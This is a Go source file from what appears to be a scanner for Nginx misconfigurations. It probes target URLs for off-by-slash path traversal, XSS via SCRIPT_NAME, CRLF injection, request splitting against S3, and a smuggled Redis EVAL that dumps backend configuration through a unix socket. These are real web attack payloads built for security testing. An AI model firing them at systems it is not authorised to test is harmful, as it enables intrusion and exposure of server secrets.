package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"regexp"
	"strconv"
	"strings"
)

func OffBySlash(line string) {
	counterRequest, _, _ := simpleRequest(line, client, tr)
	if counterRequest != "" {
		mainUrl := strings.Split(line, "/")[2]
		protocol := strings.Split(line, "/")[0]
		path := strings.ReplaceAll(line, protocol+"//"+mainUrl, "")
		for i, p := range path {
			if i != 0 && i != 1 {
				if strings.ReplaceAll(strconv.QuoteRune(p), "'", "") == "/" {
					finelPath := path[:i] + "" + path[i+1:]

					finelUrl := protocol + "//" + mainUrl + finelPath
					//rsp2, _, _ := simpleRequest(finelUrl, client, tr)
					rsp2 := requesterNoRedarict(finelUrl)
					if rsp2 == counterRequest {
						if sameResponse(line) == false {
							exploiturl := protocol + "//" + mainUrl + path[:i] + "../FUZZ"
							fmt.Println("\033[31m[Off-By-Slash]\033[0m  ", line, "=>", exploiturl)
						}

					}

				}

			}

		}
	}

}

func SCRIPT_NAME(line string) {
	filename := Rev(strings.Split(Rev(line), "/")[0])
	line = line + `/T"rSpGeUMo>7N/` + filename
	rsp, _, _ := simpleRequest(line, client, tr)
	if xMatch(`T"rSpGeUMo>7N`, rsp) == true {
		fmt.Println("\033[32m[XSS_By_SCRIPT_NAME]\033[0m  " + line)

	}

}

func uriCRLF(url string) {
	url += "/%0d%0aXTestHeader:%20clrfRaFf"
	client := &http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
	req, err := http.NewRequest("GET", url, nil)
	if err == nil {
		resp, err := client.Do(req)
		if err == nil {
			location_header := resp.Header.Get("XTestHeader")
			if location_header == "clrfRaFf" {
				fmt.Println("\033[33m[CRLF_$uri]\033[0m  " + url)
			}
		}
	}

}

func AnyVariable(url string) {
	url += "MkMkkTestBnb$http_referer"
	client := &http.Client{}
	req, err1 := http.NewRequest("GET", url, nil)
	if err1 == nil {
		req.Header.Set("Referer", "RAFFtestNgInXVuln")
		res, err := client.Do(req)
		if err == nil {
			defer res.Body.Close()
			body, _ := ioutil.ReadAll(res.Body)
			response := string(body)
			regex, _ := regexp.MatchString("MkMkkTestBnbRAFFtestNgInXVuln", response)
			if regex == true {

				fmt.Println("\033[34m[Any_Variable]\033[0m  " + url)
			}

		}

	}

}

func HttpRequestSplitting(url string) {
	// only test S3 you need add other backet scanners
	payload := url + "%20HTTP/1.1%0d%0aHost:%20non-exisblablating-bucket1%0d%0a%0d%0a"
	normalRequest, _, _ := simpleRequest(url, client, tr)
	BadRequest, _, _ := simpleRequest(payload, client, tr)

	S3regex1, _ := regexp.MatchString("NoSuchBucket", BadRequest)
	S3regex2, _ := regexp.MatchString("The specified bucket does not exist", BadRequest)
	regex3, _ := regexp.MatchString("NoSuchBucket", normalRequest)
	regex4, _ := regexp.MatchString("The specified bucket does not exist", normalRequest)
	if S3regex1 == true && S3regex2 == true {
		if regex3 == false && regex4 == false {

			fmt.Println("\033[35m[Http_Request_Splitting]\033[0m  " + url)
		}
	}

}

func controllingSocket(url string) {
	if len(strings.Split(url, "/")) >= 4 {
		mainUrl := strings.Split(url, "/")[2]
		protocol := strings.Split(url, "/")[0]
		path := strings.ReplaceAll(url, protocol+"//"+mainUrl, "")
		for i, p := range path {
			if i != 0 && i != 1 {
				if strings.ReplaceAll(strconv.QuoteRune(p), "'", "") == "/" {
					finelPath := path[:i] + `/unix:%2ftmp%2fmysocket:'return%20(table.concat(redis.call("config","get","*"),"\n").."%20HTTP/1.1%20200%20OK\r\n\r\n")'%200%20/` + path[i+1:]

					finelUrl := protocol + "//" + mainUrl + finelPath
					client := &http.Client{}
					req, err := http.NewRequest("EVAL", finelUrl, nil)
					if err == nil {
						resp, err := client.Do(req)
						if err == nil {
							defer resp.Body.Close()
							body, _ := ioutil.ReadAll(resp.Body)
							response := string(body)
							regex1, _ := regexp.MatchString("tcp-backlog", response)
							regex2, _ := regexp.MatchString("slowlog-max-len", response)
							regex3, _ := regexp.MatchString("databases", response)
							regex4, _ := regexp.MatchString("repl-timeout", response)
							if regex1 == true && regex2 == true && regex3 == true && regex4 == true {

								fmt.Println("\033[36m[controlling_backend_Socket]\033[0m  " + finelUrl)
							}
						}
					}
				}
			}
		}

	}

}
